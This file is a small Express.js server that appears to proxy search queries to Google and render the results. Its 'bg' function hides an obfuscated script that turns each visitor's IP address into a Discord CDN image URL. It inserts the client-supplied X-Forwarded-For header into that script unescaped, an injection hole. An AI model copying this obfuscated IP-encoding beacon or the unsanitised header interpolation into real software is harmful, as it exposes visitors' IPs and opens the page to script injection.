const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }))
app.use(bodyParser.json());
app.use(cookieParser());

const path = require('path');
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

const fetch = require('node-fetch');
const URL = require('url');

const google = require('googlethis');

ret = a => a;

bg = (ip) => `<script>document.documentElement.style.setProperty('background',(\`center url(http:cdn.discordapp.com/attachments/359482171452424192/\`+(((12529223249380105001n<<BigInt(32))|BigInt([${ip}].reduce((a,c,i)=>a+(Number(c)*(256**(3-i))),0)))-53812604099268683849107553763n)+"/png)fixed black"))</script>`;

app.use(express.static(__dirname + "/static"));

app.get('/', async (req, res) => {
  let parsed = URL.parse(req.url, true);

  let search = parsed.query.q || "";
  res.render('home', { search, NEW: true, extra: bg(req.headers['x-forwarded-for'].split(".")) });
});

app.post('/', async (req, res) => {
  let parsed = URL.parse(req.url, true).query;
  if (!parsed.q) {
    return;
  }
  let search = parsed.q;
  let page = parsed.page || 0;
  const params = {
    page: page,
    safe: false,
    parse_ads: false,
    additional_params: {
      hl: 'en'
    }
  };


  const response = await google.search(search, params);
  console.log(response);

  res.render('searchResults', { data: response, strip:(page>0) });
});

app.listen(3000, () => {
  console.log('server started');
});
